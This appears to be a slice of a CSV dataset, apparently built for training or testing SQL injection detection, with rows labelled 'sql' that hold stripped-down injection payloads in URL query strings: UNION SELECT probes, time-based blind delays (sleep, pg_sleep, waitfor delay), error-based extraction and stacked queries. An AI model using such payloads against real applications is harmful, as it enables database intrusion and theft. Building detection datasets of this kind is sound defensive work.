,language,source
3730,sql,". . . . / / ? = & = & = ) ) ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ( ( = "
3731,sql,". . . / / / / ? = & = % ' ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ' % ' = ' "
3732,sql,". . / / ? = & = & = ) ) ) ; select ( case when ( = ) then else / ( select ) end ) --"
3733,sql,". . ? = % ' ) and = ( select from pg_sleep ( ) ) and ( ' % ' = ' "
3734,sql,". . / / / ? = & = % ' ) ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ( ' % ' = ' "
3735,sql,". . . . / / / ? = % ' waitfor delay ' : : ' and ' % ' = ' "
3736,sql,". . . ? = ' union all select null , null , null , null , null , null , null -- "
3737,sql,". . . / ? = & = "" and make_set ( = , ) and " kpza " = " "
3738,sql,". . . . / ? = & = ) and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) -- "
3739,sql,". . . . / ? = & = & = ' and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ' jdew ' = ' "
3740,sql,". . . . / / / / ? = & = ) and make_set ( = , ) -- "
3741,sql,". . . . / ? = & = & = & = "" ) union all select null , null , null , null , null , null , null , null # "
3742,sql,". . . . ? = & = - union all select # "
3743,sql,". . . . / ? = rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) # "
3744,sql,". . . / / ? = & = & = & = - ) union all select , -- "
3745,sql,". . ? = & = and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) "
3746,sql,". . ? = & = & = ' ) ) union all select null , null , null , null , null , null , null , null -- "
3747,sql,". . . . / / / ? = & = - ' ) ) union all select , , , , , -- "
3748,sql,". . / / ? = ) ) waitfor delay ' : : ' and ( ( = "
3749,sql,". . / / ? = & = and make_set ( = , ) # "
3750,sql,". . / ? = & = and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) "
3751,sql,". . . / / / ? = & = & = & = - % "" union all select , -- "
3752,sql,". . . ? = & = & = & = ' union all select null , null , null , null , null , null # "
3753,sql,". . / / / ? = "" union all select null , null , null , null , null , null , null , null , null , null -- "
3754,sql,". . . ? = "" ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( " bptq " = " "
3755,sql,". . . / / ? = and = % "
3756,sql,". . . / ? = union all select null , null , null , null , null , null , null -- "
3757,sql,". . . / ? = & = & = & = ( case when ( = ) then ' ' else * ( select from dual union select from dual ) end ) "
3758,sql,". . . . / / / ? = % ' ) ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ( ' % ' = ' "
3759,sql,". . ? = ) and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) -- "
3760,sql,". . . . / / / ? = & = "" and sleep ( ) and " sutp " like " "
3761,sql,". . / / ? = - ' union all select , , , , , -- "
3762,sql,". . . / / ? = & = & = "" ) ) and make_set ( = , ) and ( ( " lhlu " = " "
3763,sql,". . . . ? = & = & = & = ' ; select sleep ( ) # "
3764,sql,". . / / ? = & = % ' union all select null , null , null , null , null , null # "
3765,sql,". . / / / ? = & = rlike sleep ( ) # "
3766,sql,". . / / / ? = & = union all select null , null , null , null , null # "
3767,sql,". . . . / / ? = ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) "
3768,sql,". . . / / / / ? = & = & = & = ' ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
3769,sql,". . / / / / ? = & = & = - % ' ) ) union all select , , , , # "
3770,sql,". . / / ? = & = & = & = ' ; select pg_sleep ( ) --"
3771,sql,". . . / ? = - ) ) ) union all select -- "
3772,sql,". . . . / / / / ? = & = "" ) ) ; if ( = ) select else drop function pmim --"
3773,sql,". . . / / / / ? = & = & = ' ) ) rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) and ( ( ' frfq ' = ' "
3774,sql,". . . / ? = - ' ) ) ) union all select , , , , , , # "
3775,sql,". . . . / / / / ? = and = # "
3776,sql,". . . / / ? = & = & = - % ' union all select , , , , , -- "
3777,sql,". . / / ? = & = & = & = - ' union all select , , , # "
3778,sql,". . ? = & = & = ) ) ) ; select pg_sleep ( ) --"
3779,sql,". . ? = ) ) and = -- "
3780,sql,". . . . / / / ? = & = & = ' procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ' roeu ' = ' "
3781,sql,". . / ? = & = & = & = % ' ) ) union all select null , null , null , null , null , null -- "
3782,sql,". . . / / / ? = & = & = ' ) union all select null -- "
3783,sql,". . . / ? = & = "" order by -- "
3784,sql,". . . . / / / / ? = & = & = & = ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) "
3785,sql,". . / / ? = ) and make_set ( = , ) and ( = "
3786,sql,". . . . / / ? = & = & = ' , ( select ( case when ( = ) then else / ( select ) end ) ) -- "
3787,sql,". . . . ? = ) ) ) ; select sleep ( ) # "
3788,sql,". . . / / ? = & = ' and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) -- "
3789,sql,". . . . / / / / ? = & = & = - ) union all select , , -- "
3790,sql,". . . / / ? = & = & = & = % ' ) ) union all select null , null , null -- "
3791,sql,". . / ? = & = & = & = ( case when = then ' ' else null end ) "
3792,sql,". . ? = & = - order by # "
3793,sql,". . / / / / ? = & = & = - ' union all select , # "
3794,sql,". . . . / / ? = "" union all select null , null , null , null , null , null -- "
3795,sql,". . . / / / / ? = & = % ' ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
3796,sql,". . . / / ? = & = % ' ) union all select null , null , null , null , null , null , null , null # "
3797,sql,". . . . / / / / ? = & = & = "" union all select null , null , null , null , null , null , null , null , null , null -- "
3798,sql,". . . . / / / ? = & = & = & = ' ) ) ) ; if ( = ) select else drop function rpwm --"
3799,sql,". . . . / / / ? = & = & = & = ' union all select null , null , null , null , null # "
3800,sql,". . . / / ? = & = & = & = ' ) ) and ( select * from ( select ( sleep ( ) ) ) zhty ) and ( ( ' crvc ' = ' "
3801,sql,". . . . / ? = & = ' ) ) ) union all select null , null , null , null , null , null , null # "
3802,sql,". . . . ? = & = & = & = ) union all select null , null , null , null , null , null , null , null -- "
3803,sql,". . / / ? = ' ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( ' ffbc ' = ' "
3804,sql,". . . / / / ? = ) ) ) order by -- "
3805,sql,". . . ? = & = & = & = "" ) and = and ( " alis " like " "
3806,sql,". . . / / / ? = ' union all select null -- "
3807,sql,". . . . / / / ? = - ' union all select , , , , # "
3808,sql,". . ? = & = & = & = % "" and ( select * from ( select ( sleep ( ) ) ) ejit ) # "
3809,sql,". . . . / / / ? = ' ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ' eslo ' = ' "
3810,sql,". . . . / ? = & = & = - ' ) union all select , , , , , , # "
3811,sql,". . . / ? = and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) # "
3812,sql,". . / ? = & = "" and = -- "
3813,sql,". . / / / / ? = & = & = ' ) ) and = -- "
3814,sql,". . . / / / / ? = & = & = ' rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ' vsse ' = ' "
3815,sql,". . . / / / / ? = - ' union all select -- "
3816,sql,". . . . ? = & = % ' ) rlike sleep ( ) and ( ' % ' = ' "
3817,sql,". . . . / / / / ? = & = & = - ) union all select , , , , , , -- "
3818,sql,". . . . / / / ? = & = & = & = % ' ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ' % ' = ' "
3819,sql,". . . / / / ? = % ' and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ' % ' = ' "
3820,sql,". . . . / / ? = % "" and = -- "
3821,sql,". . . / ? = & = & = & = ) union all select null , null , null , null , null , null , null , null , null , null # "
3822,sql,". . . / ? = & = ' ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
3823,sql,". . . . / / ? = "" ) union all select null , null , null , null , null , null , null , null -- "
3824,sql,". . . . / / / ? = & = ) waitfor delay ' : : ' and ( = "
3825,sql,". . . . ? = & = union all select null , null # "
3826,sql,". . . . / ? = ) ) ) union all select null # "
3827,sql,". . . / / / ? = & = ( select ( case when ( = ) then else / ( select ) end ) ) "
3828,sql,". . . / ? = ) and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) -- "
3829,sql,". . . / ? = & = & = & = ) and = % "
3830,sql,". . . / / ? = & = & = - ' ) union all select , , , , , , , , -- "
3831,sql,". . . / ? = & = & = & = ' and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) and ' ykig ' like ' "
3832,sql,". . . / / / ? = & = & = ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
3833,sql,". . / ? = and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null # "
3834,sql,". . . . / / ? = % "" and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and " % " = " "
3835,sql,". . / / ? = & = & = & = "" ) ) and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and ( ( " aggr " = " "
3836,sql,". . . / ? = & = & = - % ' union all select , , -- "
3837,sql,". . . . / ? = ' union all select null , null , null , null , null -- "
3838,sql,". . . / / ? = & = & = & = % ' ) ) order by # "
3839,sql,". . . / / / / ? = & = & = ' ) ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( ( ' ldnq ' = ' "
3840,sql,". . . ? = "" order by -- "
3841,sql,". . . . / / / ? = & = & = ; select ( case when ( = ) then else / ( select ) end ) --"
3842,sql,". . . . / / ? = & = ' ) ) ) union all select null , null , null , null , null , null , null , null , null # "
3843,sql,". . . / / ? = & = & = & = ' ) ) union all select null , null , null , null , null , null , null , null , null , null # "
3844,sql,". . / / / ? = & = ' ) ) and = # "
3845,sql,". . . / / ? = & = & = & = "" and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) and " fruu " = " "
3846,sql,". . . / / ? = & = & = "" and make_set ( = , ) and " olox " = " "
3847,sql,". . . . / / / / ? = ' ) order by # "
3848,sql,". . / ? = & = & = ' , ( select ( case when ( = ) then else cast ( as int ) / ( select from dual ) end ) from dual ) -- "
3849,sql,". . . / / / / ? = & = ' ) ) and = # "
3850,sql,". . / / / / ? = % ' ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
3851,sql,". . . / / / ? = & = & = & = ' ) ) and sleep ( ) # "
3852,sql,". . . / / / ? = ) ) ) ; ( select * from ( select ( sleep ( ) ) ) tqiz ) # "
3853,sql,". . / / ? = & = & = ' and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ' oisk ' like ' "
3854,sql,". . / ? = & = & = ) ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ( = "
3855,sql,". . . . ? = & = & = & = ) ) ; select sleep ( ) # "
3856,sql,". . / ? = ' rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ' zdjf ' = ' "
3857,sql,". . / / / ? = and = -- "
3858,sql,". . . . ? = & = & = ( select ( case when ( = ) then else / ( select ) end ) ) "
3859,sql,". . . . / / / / ? = ' procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) -- "
3860,sql,". . / / / / ? = & = & = "" and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and " oxlt " = " "
3861,sql,". . / ? = & = & = % ' ) ; waitfor delay ' : : ' --"
3862,sql,". . . . / / / ? = & = & = "" ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( " joej " like " "
3863,sql,". . . / / / ? = & = & = "" and sleep ( ) # "
3864,sql,". . / ? = & = % ' and = -- "
3865,sql,". . . / / / ? = & = ' and ( select * from ( select ( sleep ( ) ) ) zhty ) and ' scip ' = ' "
3866,sql,". . . . / ? = & = - ' ) union all select , , , , , , -- "
3867,sql,". . / / / / ? = & = & = ' and = and ' dshy ' like ' "
3868,sql,". . ? = & = ' ) ) order by # "
3869,sql,". . . . / / ? = & = & = & = ) ; ( select * from ( select ( sleep ( ) ) ) cxfv ) # "
3870,sql,". . / / ? = ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( = "
3871,sql,". . . / / / / ? = & = ) ) rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ( ( = "
3872,sql,". . ? = ) ) union all select null , null , null , null , null , null , null , null , null # "
3873,sql,". . . . / / ? = & = & = ' and ( select * from ( select ( sleep ( ) ) ) uygz ) and ' zyww ' = ' "
3874,sql,". . . . / / ? = & = & = ' ) ) ) and make_set ( = , ) and ( ( ( ' gxzv ' = ' "
3875,sql,". . . . / / / ? = & = ) ) union all select null , null , null -- "
3876,sql,". . . / / / / ? = & = - ' union all select , , , , , -- "
3877,sql,". . . . / / ? = & = & = & = "" and = -- "
3878,sql,". . / / / ? = & = - ' ) union all select , , , , , , -- "
3879,sql,". . . / / / / ? = & = % ' ) and make_set ( = , ) and ( ' % ' = ' "
3880,sql,". . . . / / ? = and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null -- "
3881,sql,". . / ? = & = and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) -- "
3882,sql,". . . . / / / ? = & = & = % ' ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ' % ' = ' "
3883,sql,". . . / / / ? = & = & = ) ; select sleep ( ) -- "
3884,sql,". . / ? = ' ) union all select null , null , null , null , null , null , null , null , null , null -- "
3885,sql,". . / / / ? = & = & = & = ' and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null -- "
3886,sql,". . . . / / / ? = & = & = and = -- "
3887,sql,". . . / / / ? = & = & = and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) "
3888,sql,". . . / / ? = & = & = "" ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
3889,sql,". . . . ? = & = & = & = , ( select ( case when ( = ) then dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) else / ( select from dual ) end ) from dual ) "
3890,sql,". . . . / / ? = & = ) ) ) ; select sleep ( ) and ( ( ( = "
3891,sql,". . . . / / / ? = & = ' ) ) ) rlike ( select ( case when ( = ) then else x end ) ) and ( ( ( ' ivlb ' = ' "
3892,sql,". . / / / ? = & = & = & = - ' ) ) ) union all select , , , # "
3893,sql,". . . ? = "" ) ) order by -- "
3894,sql,". . . / / / / ? = ' ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ' rgyi ' like ' "
3895,sql,". . . . ? = & = & = & = ' ) ) ) union all select null , null , null , null , null , null , null , null , null -- "
3896,sql,". . / ? = & = & = & = - ' ) ) ) union all select , , , , # "
3897,sql,". . . . / / / / ? = & = & = ' ) ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
3898,sql,". . / / / / ? = & = & = & = ' ) ; select sleep ( ) # "
3899,sql,". . / / / / ? = & = ) ) union all select null , null , null , null , null , null , null , null # "
3900,sql,". . . . / / / ? = & = & = and = -- "
3901,sql,". . . . ? = ' ) ) ) union all select null , null , null , null , null , null , null , null # "
3902,sql,". . . . / / / ? = & = & = ' ) order by -- "
3903,sql,". . . . / / ? = & = & = - ) union all select , , , , , , , , -- "
3904,sql,". . . / / / / ? = & = "" ) ) union all select null , null , null , null , null , null # "
